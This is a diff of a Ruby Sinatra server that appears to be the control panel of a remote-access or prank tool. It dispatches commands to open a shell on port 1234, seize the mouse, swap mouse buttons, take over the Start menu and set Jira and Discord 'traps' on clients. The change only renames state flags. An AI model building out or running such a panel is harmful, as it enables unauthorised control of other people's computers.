@@ -314,7 +314,7 @@ class MyServer < Sinatra::Base
           $semaphore.synchronize { @mClient.shell }
           @msg = "Trying open shell on port 1234 from #{@mClient.name}."
         when "get-mouse"
-          if @mClient.mouseTaken == 0
+          if @mClient.isMouseTaken == 0
             $semaphore.synchronize { @mClient.get_mouse }
             @msg = "Trying to get mouse on #{@mClient.name}."
           else
@@ -322,7 +322,7 @@ class MyServer < Sinatra::Base
             @msg = "Giving mouse back to #{@mClient.name}."
           end
         when "trap-jira"
-          if @mClient.jiraTrap == 0
+          if @mClient.isJiraTrapSet == 0
             $semaphore.synchronize { @mClient.trap_on_jira }
             @msg = "Settting on Jira trap on #{@mClient.name}."
           else
@@ -330,7 +330,7 @@ class MyServer < Sinatra::Base
             @msg = "Killing Jira trap on #{@mClient.name}."
           end
         when "take-over-menustart"
-          if @mClient.menuStart == 0
+          if @mClient.isMenuStartTaken == 0
             $semaphore.synchronize { @mClient.get_menu_start }
             @msg = "Killing Menu Start on #{@mClient.name}."
           else
@@ -338,7 +338,7 @@ class MyServer < Sinatra::Base
             @msg = "Giving back Menu Start on #{@mClient.name}."
           end
         when "swap-mouse-keys"
-          if @mClient.mouseSwappeed == 0
+          if @mClient.areMouseButtonsSwapped == 0
             $semaphore.synchronize { @mClient.swap_mouse }
             @msg = "Mouse Keys has been swapped on #{@mClient.name}."
           else
@@ -346,7 +346,7 @@ class MyServer < Sinatra::Base
             @msg = "Mouse keys set on normal on #{@mClient.name}."
           end
         when "set-discord-trap"
-          if @mClient.discordTrap == 0
+          if @mClient.isDiscordTrapSet == 0
             $semaphore.synchronize { @mClient.set_discord_trap }
             @msg = "Settin on Discord Trap on #{@mClient.name}."
           else
